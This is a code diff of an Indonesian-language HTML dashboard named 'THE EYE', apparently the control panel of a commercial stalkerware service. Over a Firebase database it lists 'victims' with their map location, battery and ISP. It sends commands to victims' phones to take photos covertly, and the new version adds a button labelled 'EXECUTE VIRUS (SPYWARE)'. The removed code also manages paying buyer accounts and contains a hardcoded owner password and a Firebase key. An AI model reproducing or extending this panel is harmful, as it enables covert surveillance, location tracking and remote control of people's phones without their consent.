@@ -2,222 +2,74 @@
 <html lang="id">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>THE EYE v19.5 - SUPREME</title>
+    <title>THE EYE v20.0 - SUPREME COMMANDER</title>
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
     <style>
-        :root { --green: #1b5e20; --gold: #ffd700; --red: #d32f2f; --blue: #1976d2; }
-        body { background: #f4f4f4; font-family: sans-serif; margin: 0; padding-bottom: 70px; }
-        .header { background: var(--green); color: white; padding: 15px; text-align: center; font-weight: bold; border-bottom: 3px solid var(--gold); position: sticky; top: 0; z-index: 100; }
-        .tab-content { display: none; padding: 15px; }
-        .active-content { display: block; }
-        .card { background: white; padding: 15px; border-radius: 15px; box-shadow: 0 4px 10px rgba(0,0,0,0.05); margin-bottom: 12px; border-left: 5px solid var(--green); position: relative; }
-        .nav-item { display: flex; flex-direction: column; align-items: center; color: #888; font-size: 11px; cursor: pointer; }
-        .nav-item.active { color: var(--green); font-weight: bold; }
-        .bottom-nav { position: fixed; bottom: 0; width: 100%; background: white; display: flex; justify-content: space-around; padding: 12px 0; box-shadow: 0 -2px 10px rgba(0,0,0,0.1); border-top-left-radius: 20px; border-top-right-radius: 20px; }
-        input, select { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #ddd; border-radius: 10px; box-sizing: border-box; }
-        button { border: none; border-radius: 10px; padding: 12px; font-weight: bold; cursor: pointer; width: 100%; background: var(--green); color: white; margin-top: 5px; }
-        .btn-red { background: var(--red); }
-        .btn-blue { background: var(--blue); }
-        .del-x { position: absolute; top: 10px; right: 15px; color: #ccc; cursor: pointer; padding: 5px; }
-        .img-preview { width: 100%; border-radius: 10px; margin-top: 10px; border: 1px solid #eee; }
-        table { width: 100%; border-collapse: collapse; font-size: 11px; margin-top: 10px; }
-        th, td { text-align: left; padding: 8px; border-bottom: 1px solid #eee; }
+        body { background: #0a0a0a; color: #00ff00; font-family: 'Courier New', monospace; margin: 0; display: flex; }
+        .sidebar { width: 300px; background: #111; height: 100vh; border-right: 2px solid #00ff00; padding: 20px; overflow-y: auto; }
+        .main-view { flex-grow: 1; padding: 20px; overflow-y: auto; background: #050505; }
+        .card { background: #1a1a1a; border: 1px solid #00ff00; padding: 15px; margin-bottom: 20px; border-radius: 5px; }
+        button { background: #00ff00; color: black; border: none; padding: 10px; font-weight: bold; cursor: pointer; margin: 5px 0; width: 100%; }
+        .btn-virus { background: #ff0000; color: white; }
+        .img-box img { width: 100%; border: 1px solid #00ff00; margin-top: 10px; }
+        h3 { border-bottom: 1px solid #00ff00; padding-bottom: 5px; }
     </style>
 </head>
 <body onload="initApp()">
 
-<div id="login-page" style="display: flex; justify-content: center; align-items: center; height: 95vh;">
-    <div class="card" style="width: 280px; text-align: center; border: none;">
-        <h2 style="color:var(--green)">THE EYE v19.5</h2>
-        <input type="text" id="u" placeholder="Username">
-        <input type="password" id="p" placeholder="Password">
-        <button onclick="doLogin()">AUTHENTICATE</button>
-    </div>
+<div class="sidebar">
+    <h3>🛰️ TARGET LIST</h3>
+    <div id="target-list">Menunggu mangsa...</div>
 </div>
 
-<div id="app-interface" style="display: none;">
-    <div class="header" id="header-title">🛰️ RADAR COMMANDER</div>
-
-    <div id="tab-radar" class="tab-content active-content">
-        <button class="btn-red" onclick="clearLogs()" style="margin-bottom:15px; font-size:12px;">🗑️ BERSIHKAN SEMUA TARGET</button>
-        <div id="log-list">Menghubungkan ke satelit...</div>
-    </div>
-
-    <div id="tab-admin" class="tab-content">
-        <div class="card" style="border-left-color: var(--gold);">
-            <h3>➕ BUAT AKUN BUYER</h3>
-            <input type="text" id="new-u" placeholder="Username Buyer">
-            <input type="text" id="new-p" placeholder="Password Buyer">
-            <select id="new-r">
-                <option value="MEMBER">MEMBER</option>
-                <option value="ADMIN">ADMIN</option>
-            </select>
-            <button class="btn-blue" onclick="createAccount()">AKTIVASI SEKARANG</button>
-        </div>
-        <div class="card">
-            <h3>👥 KELOLA BUYER</h3>
-            <div id="user-list" style="overflow-x: auto;"></div>
-        </div>
-    </div>
-
-    <div id="tab-settings" class="tab-content">
-        <div class="card">
-            <h3>⚙️ INFO AKUN</h3>
-            <p>Login: <b id="display-name" style="color:var(--green)"></b></p>
-            <button onclick="doLogout()" style="background:#444;">LOGOUT</button>
-        </div>
-    </div>
-
-    <div class="bottom-nav">
-        <div class="nav-item active" onclick="switchTab('tab-radar', '🛰️ RADAR', this)"><i>🛰️</i><span>Radar</span></div>
-        <div id="nav-admin" class="nav-item" onclick="switchTab('tab-admin', '👥 ADMIN', this)"><i>👥</i><span>Admin</span></div>
-        <div class="nav-item" onclick="switchTab('tab-settings', '⚙️ AKUN', this)"><i>⚙️</i><span>Akun</span></div>
-    </div>
+<div class="main-view" id="monitor">
+    <h2>📡 MONITORING CENTER v20.0</h2>
+    <p>Pilih target dari sidebar untuk melihat detail.</p>
 </div>
 
 <script>
-    // CONFIG KALZ 🎯
-    const firebaseConfig = {
-      apiKey: "AIzaSyAqdcpcUxfUBNY2H83IBa1Pp0X6YcQtDlQ",
-      authDomain: "theeyes-8d0aa.firebaseapp.com",
-      databaseURL: "https://theeyes-8d0aa-default-rtdb.asia-southeast1.firebasedatabase.app",
-      projectId: "theeyes-8d0aa",
-      storageBucket: "theeyes-8d0aa.firebasestorage.app",
-      messagingSenderId: "886775568743",
-      appId: "1:886775568743:web:89a5a2b26628711fedf7c2"
-    };
-
+    const firebaseConfig = { /* TEMPEL CONFIG LU DISINI */ };
     firebase.initializeApp(firebaseConfig);
     const db = firebase.database();
-    let currentUser = null;
 
     function initApp() {
-        const saved = sessionStorage.getItem("user");
-        if(saved) { currentUser = JSON.parse(saved); renderDashboard(); }
-    }
-
-    function doLogin() {
-        const u = document.getElementById('u').value, p = document.getElementById('p').value;
-        if(u === 'kalz' && p === '111') {
-            currentUser = {u: 'kalz', r: 'OWNER'};
-            sessionStorage.setItem("user", JSON.stringify(currentUser));
-            return renderDashboard();
-        }
-        db.ref('users/' + u).once('value', (s) => {
-            const v = s.val();
-            if(v && v.p === p) {
-                currentUser = {u: u, r: v.r};
-                sessionStorage.setItem("user", JSON.stringify(currentUser));
-                renderDashboard();
-            } else alert("AKSES DITOLAK!");
-        });
-    }
-
-    function renderDashboard() {
-        document.getElementById('login-page').style.display='none';
-        document.getElementById('app-interface').style.display='block';
-        document.getElementById('display-name').innerText = currentUser.u.toUpperCase();
-        if(currentUser.r !== 'OWNER') document.getElementById('nav-admin').style.display = 'none';
-        startRadar();
-        if(currentUser.r === 'OWNER') loadUsers();
-    }
-
-    function switchTab(id, title, el) {
-        document.querySelectorAll('.tab-content').forEach(t => t.classList.remove('active-content'));
-        document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
-        document.getElementById(id).classList.add('active-content');
-        document.getElementById('header-title').innerText = title;
-        el.classList.add('active');
-    }
-
-    // --- FITUR RADAR & COMMAND FOTO ---
-    function startRadar() {
-        db.ref('korban').on('value', (snapshot) => {
-            const data = snapshot.val();
-            let html = "";
-            let keys = data ? Object.keys(data).reverse() : [];
-            keys.forEach(id => {
-                const k = data[id];
-                html += `<div class="card" style="border-left-color:var(--red);">
-                    <span class="del-x" onclick="deleteLog('${id}')">✖</span>
-                    <b style="color:var(--red);">📍 TARGET TERKUNCI!</b><br>
-                    <small>${k.waktu}</small><hr>
-                    🔋 Bat: ${k.baterai} | 📶 ISP: ${k.isp}<br>
-                    🌍 <a href="${k.maps}" target="_blank" style="color:var(--blue); font-weight:bold;">LIHAT LOKASI</a><br>
-                    <button class="btn-blue" onclick="reqFoto('${id}')" style="font-size:10px; width:auto; padding:5px; margin-top:10px;">📸 REQUEST FOTO TERBARU</button>
-                    <div id="foto-${id}"></div>
-                </div>`;
-                
-                // Realtime Preview Foto
-                db.ref('hasil_foto/' + id).on('value', (fsnap) => {
-                    const fdata = fsnap.val();
-                    if(fdata) {
-                        document.getElementById(`foto-${id}`).innerHTML = `<img src="${fdata.foto}" class="img-preview">`;
-                    }
-                });
-            });
-            document.getElementById('log-list').innerHTML = html || "Menunggu mangsa...";
-        });
-    }
-
-    function reqFoto(id) {
-        db.ref('commands/' + id).set({action: "TAKE", t: Date.now()});
-        alert("🛰️ Perintah Jepret Dikirim ke HP Korban!");
-    }
-
-    function deleteLog(id) {
-        if(confirm("Hapus target ini?")) {
-            db.ref('korban/' + id).remove();
-            db.ref('hasil_foto/' + id).remove();
-            db.ref('commands/' + id).remove();
-        }
-    }
-
-    function clearLogs() {
-        if(confirm("Hapus SEMUA data target?")) {
-            db.ref('korban').remove();
-            db.ref('hasil_foto').remove();
-            db.ref('commands').remove();
-        }
-    }
-
-    // --- FITUR ADMIN (KONTROL BUYER) ---
-    function createAccount() {
-        const u = document.getElementById('new-u').value, p = document.getElementById('new-p').value, r = document.getElementById('new-r').value;
-        if(u && p) {
-            db.ref('users/' + u).set({p: p, r: r}, () => {
-                alert("Akun Buyer " + u + " Berhasil Diaktifkan!");
-                document.getElementById('new-u').value = "";
-                document.getElementById('new-p').value = "";
-            });
-        }
-    }
-
-    function loadUsers() {
-        db.ref('users').on('value', (s) => {
-            const users = s.val();
-            let h = "<table><tr><th>USER</th><th>PASS</th><th>ROLE</th><th>AKSI</th></tr>";
-            for(let u in users) {
-                h += `<tr>
-                    <td>${u}</td>
-                    <td>${users[u].p}</td>
-                    <td>${users[u].r}</td>
-                    <td><button class="btn-red" style="padding:4px; font-size:10px; width:auto;" onclick="deleteUser('${u}')">HAPUS</button></td>
-                </tr>`;
+        db.ref('korban').on('value', snap => {
+            const data = snap.val();
+            let h = "";
+            for(let id in data) {
+                h += `<button onclick="viewTarget('${id}')">📍 ${data[id].waktu}</button>`;
             }
-            document.getElementById('user-list').innerHTML = h + "</table>";
+            document.getElementById('target-list').innerHTML = h;
         });
     }
 
-    function deleteUser(u) {
-        if(confirm("Hapus akun buyer " + u + "? Mereka tidak akan bisa login lagi.")) {
-            db.ref('users/' + u).remove();
-        }
+    function viewTarget(id) {
+        db.ref('korban/' + id).once('value', snap => {
+            const k = snap.val();
+            let html = `
+                <div class="card">
+                    <h3>INFO TARGET: ${id}</h3>
+                    <p>🕒 Waktu: ${k.waktu} | 🔋 Bat: ${k.baterai}</p>
+                    <p>🌍 Maps: <a href="${k.maps}" target="_blank" style="color:cyan">BUKA KOORDINAT</a></p>
+                    <button onclick="sendCmd('${id}', 'TAKE')">📸 REQUEST FOTO SEKARANG</button>
+                    <button class="btn-virus" onclick="sendCmd('${id}', 'VIRUS')">☣️ EXECUTE VIRUS (SPYWARE)</button>
+                    <div id="photo-area-${id}" class="img-box">Memuat foto...</div>
+                </div>`;
+            document.getElementById('monitor').innerHTML = html;
+            
+            // Listen Foto
+            db.ref('hasil_foto/' + id).on('value', fsnap => {
+                const f = fsnap.val();
+                if(f) document.getElementById(`photo-area-${id}`).innerHTML = `<img src="${f.foto}">`;
+            });
+        });
     }
 
-    function doLogout() { sessionStorage.clear(); location.reload(); }
+    function sendCmd(id, action) {
+        db.ref('commands/' + id).set({ action: action, t: Date.now() });
+        alert("Command " + action + " Sent!");
+    }
 </script>
 </body>
 </html>
